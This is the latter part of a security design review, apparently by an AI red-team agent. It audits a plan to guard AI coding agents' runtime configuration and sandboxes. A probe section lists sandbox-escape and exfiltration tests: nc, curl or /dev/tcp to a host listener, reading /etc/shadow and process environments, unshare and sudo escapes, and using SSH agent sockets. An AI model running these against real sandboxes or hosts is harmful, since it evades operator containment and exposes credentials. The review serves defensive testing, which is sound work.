   a declared sandbox flag (H5).
7. "MCP for agents" as adoption without an operator-only gate; the audited party must not get the
   audit report (H10).
8. "Harden this setup" if it launches anything other than a fixed-argv display/copy of a read-only
   command (M1).
9. "Catches the article-shaped mistake" (`:320`) without the defaults/precedence/hook coverage that
   makes the catch true (H1–H3); state it as "reports the configuration facts the demo depends on".
10. Any secret-class list that omits environment variables and agent auth stores while telling the
    user the list is what the agent can reach (H4).

---

## 6. Article-lesson scorecard

| Lesson (`article-notes.md:21-24`) | Plan status | Evidence |
| --- | --- | --- |
| Separate network from execution | **Partial.** Slice B gives the shell a netns, but the agent process holds model egress and tool execution; no broker. | `:124-139`; H9 |
| Sandbox both | **Partial.** Shell sandboxed; model client boundary unspecified; project `.env`/`.git/hooks` mounted rw. | H9 |
| Log crossings | **Partial.** Tool calls and network crossings logged; the tool-output → model-request crossing is not named; no secret-free/redaction requirement for logs. | `:133-134`; H9 |
| Do not rely on domain allowlists | **At risk.** Shell domain allowlists are avoided, but the model trust entry is an allowlist and egress is inferred from config claims. | `:114`, `:117`, `:246`; H5/H8 |

Verdict: the lesson is **not fully absorbed**. The plan's threat narrative is correct, but the four
controls are prose in Slice B, two are only partially satisfied, and the Slice A trust/egress model
reproduces the allowlist mistake the article warns about. The four rows should become acceptance
criteria in Slice B and explicit limitations in Slice A.

---

## 7. Slice B minimum probe set (distinguish an OS boundary from a wrapper convention)

Run each probe twice: once through the wrapper, once through an arbitrary descendant route
(`setsid`, double-fork, `bwrap` nesting, a different parent). A real boundary passes both runs; a
wrapper convention passes only the first.

1. **Host listener egress.** Start a listener on the host loopback; from the shell, attempt
   `curl`/`wget`/`/dev/tcp`/`nc` to it and to the host's LAN address. Expect refusal/timeout with no
   connection accepted.
2. **DNS.** `getent hosts example.invalid` and a direct UDP/53 attempt. Expect no resolver or a
   failing one; no leak of query names.
3. **Filesystem canary.** Read a root-owned canary outside the project (`$HOME/canary`, `/etc/shadow`,
   another user's home); write outside the project; read `/proc/1/root`. Expect `EACCES`/`ENOENT`/
   `EROFS`, not the bytes.
4. **Process/namespace visibility.** Read `/proc/<host-pid>/environ`, `/proc/1/status`; check
   `NSpid`, `CapEff`, seccomp mode. Expect host PIDs invisible, capabilities dropped, seccomp
   present.
5. **Privilege/escape.** `unshare -Ur`, `mount`, nested `bwrap`, `sudo`, `chroot` from inside; expect
   failure. A successful user namespace or mount is a boundary failure.
6. **Inherited channels.** Check `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, `DBUS_SESSION_BUS_ADDRESS`,
   proxy env vars, provider keys, and any model-proxy socket in the shell's environment and open FDs;
   attempt to use each. Expect none present/usable.
7. **Model-channel canary.** Shell writes a sentinel into stdout/tool output; assert whether the
   proxy/agent forwards it to the model endpoint, and whether the proxy redacts/blocks it. This is
   the H9 probe: a shell netns cannot pass it by itself.
8. **Mount policy.** Read `project/.env`, `project/.git/hooks/*`, and a symlink in the project that
   points outside; expect masked/absent or explicit, documented exposure.
9. **Un-wrapped control.** Start the agent binary directly, outside the wrapper; the guarantee must
   visibly not apply, and the docs must say so. This is the control that proves the tests are
   measuring the boundary rather than the wrapper's own good behavior.

Falsification criterion: **any single descendant process that opens a TCP connection to the host
listener, reads a canary outside the project, sees a host PID, or gets a sentinel into a model
request fails the claim.** "Tests pass when called through the wrapper" is not a criterion.

---

## 8. Cleared / not exploitable as designed

- **Model-weight scanning.** The plan rejects it as a non-goal (`:70`) and limits option C to
  provenance (`:322-326`); it does not claim trigger detection. Correct.
- **No execution in Slice A.** Consistent across `:98-100`, `:261-263`; the article's payload is not
  run. Correct.
- **No secret values in output.** The requirement (`:99`, `:263-264`) is right; the gap is path
  sanitization and the secret-class model, not value handling.
- **Same-UID limitation.** Stated honestly (`:269-270`); it is the reason M3's integrity claim must
  be narrowed, not a defect by itself.
- **AUR chroot is not a general sandbox.** The plan's citation matches
  `docs/SECURITY_BOUNDARIES.md:150-159` (chroot shares the host kernel). Correct.
- **Slice separation.** Slice B has its own funding decision (`:309-310`) and the option table
  recommends A first (`:324-326`). The separation is clean except for the Harden wording (M1).
- **Provenance-only model signal.** `:114` says "provenance signal, not proof of malice"; the
  wording is honest, but the trust-entry escape and the name need H8.
- **Existing guard primitives.** `guards.resolve_regular_file`/`read_capped`
  (`guards.py:43-127`) are a sound base for Slice A's file reads (identity-bound, `O_NOFOLLOW`,
  size-capped); the plan should cite and reuse them rather than write a new file reader. The
  directory-walk case is M2.
- **MCP `readOnlyHint`.** The proposed tool is genuinely read-only; the problem is caller identity
  (H10), not the annotation.
- **Duplicate-key strictness.** The existing JSON reader rejects ambiguous keys
  (`instruction_guard.py:3911`); test 7's duplicate-key requirement is achievable and should reuse
  that behavior.

---

## 9. Not verified / limitations

- **Agent defaults and precedence.** The actual default toolset and default approval mode of current
  Codex, Claude Code, Cursor and generic MCP clients, and each vendor's project-vs-user precedence,
  were not fetched or executed. H1/H3 are plan-grounded design gaps; their runtime severity needs a
  pinned vendor/version fixture.
- **No live agent, model, endpoint or MCP server** was started; no real credential or home directory
  was scanned. The "aggregate fires on every dev machine" claim is inferred from path semantics and
  prevalence, not measured on a corpus.
- **No sandbox was built.** The Slice B probes are a test design, not results.
- **The desktop Harden action and MCP tool do not exist**, so M1/H10 are design findings; the
  existing patterns cited (`main.cjs:259-281`, `argv.cjs:71-85`, `contract.ts:18-19`) were verified.
- **Large-file coverage.** `agent.py` (3,868 lines) and `instruction_guard.py` (8,783 lines) were read
  at the cited policy/discovery/hook/MCP/config regions, not exhaustively. A full-file audit is a
  different task.
- **Article content beyond the notes.** Only `findings/agent-guard/article-notes.md` was used; the
  source URL was not fetched (scope says `allow_recon_thirdparties: no`, and it was not needed).
- **Directory-walk race behavior.** The parent-component swap analysis is reasoned from
  `guards.py:43-127`; no race fixture was executed. The existing `read_capped` binds file identity,
  but the new directory walker is unimplemented and could regress it.

---

## 10. Commands and paths used

Read-only review; no repository files were modified except the harness artifacts `ledger.json` and
the two deliverables named below.

- `date`; `git status --short`; `git ls-files --error-unmatch ledger.json`; `git check-ignore -v ledger.json`
- `read_file` on `design/agent-guard-plan.md`, `findings/agent-guard/article-notes.md`,
  `findings/agent-guard/card-{architect,red,reviewer}.md`,
  `aurascan/mcp/tools/audit_agent_config.py`
- `grep -n` / `sed -n` on `aurascan/core/agent.py` (policy constants `:128-292`, predicates
  `:926-1055`, env `:1943-1961`, sanitizers `:856`, `:1963`),
  `aurascan/core/instruction_guard.py` (classification `:1577-1612`, CodeWhale `:2533-2540`, hook
  parser `:3621-3643`, JSON config `:3742-3911`, hooks `:3798-3816`, Cursor trust `:4088`, MCP
  `:4156-4190`, surfaces `:4203-4225`), `aurascan/core/agent_config.py` (allow_shell `:56`,
  `:243-270`), `aurascan/mcp/guards.py` (`:43-127`), `aurascan/mcp/__main__.py:86`,
  `aurascan/mcp/registry.py` (schemas/annotations), `desktop/electron/main.cjs:259-281`, `:368`,
  `desktop/electron/argv.cjs:61-135`, `desktop/src/contract.ts:18-19`, `:399-453`,
  `docs/SECURITY_BOUNDARIES.md:150-159`, `tests/test_instruction_guard.py` hook/MCP tests
- `python3 ~/.hermes/profiles/red/skills/red-harness/scripts/ledger.py . --files ...` → 14 files,
  all `checked`
- `python3 ~/.hermes/profiles/red/skills/red-harness/scripts/candidates.py . --files
  aurascan/core/agent.py,aurascan/core/agent_config.py,aurascan/mcp/tools/audit_agent_config.py,aurascan/mcp/guards.py,aurascan/mcp/registry.py --max 500`
  → 290 leads (classes reviewed; not findings)
- `jq` for ledger/candidate counts
- `python3 ~/.hermes/profiles/red/skills/red-harness/scripts/validate_findings.py
  findings/agent-guard/red-findings.json` → `ok: 19 finding(s), coverage complete`

Deliverables: this file and `findings/agent-guard/red-findings.json` (schema-validated structured
findings). `ledger.json` is the harness coverage record.

---

## 11. Adversarial self-check (Phase 5)

Each confirmed finding was re-opened and an attempt was made to disprove it:

- **B1** — Tried to read the `:155-156` parenthetical as "every incomplete surface is exit 3". The
  table does not say that; it says exit 3 is "audit could not complete", while
  `AGENT-RUNTIME-CONFIG-INCOMPLETE-001` is a MEDIUM finding. Kept as a contract ambiguity/blocker,
  with the explicit alternative reading stated.
- **H1** — Tried to argue that an empty config means no shell. Agent defaults make that unsupported;
  kept as `needs_validation` rather than `confirmed` because the vendor tables were not fetched.
- **H2** — Tried to argue hooks are outside "runtime configuration". The plan's own goal is what the
  agent can execute; a hook is configuration that executes. Kept, with the generic-MCP caveat added.
- **H3** — Tried to argue vendor precedence is always deny-wins. No evidence; the plan must model it
  or fail closed. Kept.
- **H4** — Tried to argue env vars are outside a path-based rule. That is exactly the defect: a shell
  reads env without touching an inventoried path. Kept.
- **H5** — Tried to argue a declared sandbox/egress setting is an OS boundary. It is a claim in the
  agent's config; no enforcement is shown. Kept.
- **H6** — Tried to argue universal HIGH is acceptable because the setup really is risky. Then the
  HIGH no longer distinguishes the article case and trains users to ignore it; kept as a
  product-signal finding, not an exploit.
- **H7** — Tried to argue a preflight is inherently point-in-time. True, but the plan does not bind
  inputs or warn; kept.
- **H8** — Tried to argue user approval is consent. Consent is not verification and does not stop a
  payload swap; kept.
- **H9** — Narrowed the finding after self-check: a local model with no remote prompt reader is
  blocked by a real shell netns. Kept for remote/attacker-readable endpoints and retained prompt
  logs, which the plan allows; the Slice B claim needs that qualifier.
- **H10** — Tried to dismiss it because the agent already has same-UID read access. True, but the
  report is a map and an evasion oracle; kept as an inference-level design finding.
- **M1–M6** — No implementation exists to disprove the risk; kept as required design constraints and
  tests, not as confirmed exploitable code.
- **L1** — Re-checked the cited code regions; the plan's "does not inspect shell/exec configuration"
  sentence is false for the shell-grant/hook/MCP parts. Kept.

What would change the disposition: a revised exit-code table that makes incomplete coverage
non-zero, a per-agent defaults/precedence model, hook/MCP-command execution rules, a host-relative
egress/approval model, and Slice B scoped to shell descendants with the §7 probe matrix. Those are
the conditions for `APPROVE WITH CONDITIONS` on the next revision.

**Disposition again: `CHANGES REQUIRED`.** B1 must be fixed before Slice A ships; H1–H10 must be
either fixed or written down as explicit, user-visible limitations; Slice B must not adopt the
":138-139" promise until §7 passes. The plan is directionally right and its non-goals are honest —
but a preflight that cannot distinguish "not checked" from "no HIGH" is the false assurance the
article warns about.
